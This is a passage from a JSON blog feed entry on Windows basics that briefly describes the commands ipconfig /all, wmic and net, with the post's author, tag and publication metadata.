routing tables, etc.</p>\n<p><strong>12. ipconfig /all:</strong> it will show all about network configuration in the system.</p>\n<p><strong>13. wmic:</strong> It provides a command-line interface for Windows Management Instrumentation (WMI).</p>\n<p><strong>14 net:</strong> This command is used to perform operations on users, groups, domains, etc.</p>",
            "image": "https://sakibulalikhan.github.io/blog/media/posts/2/powershell.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Windows Basics"
            ],
            "date_published": "2021-11-16T22:14:31+06:00",
            "date_modified": "2021-11-16T23:02:14+06:00"
        }
    ]
}
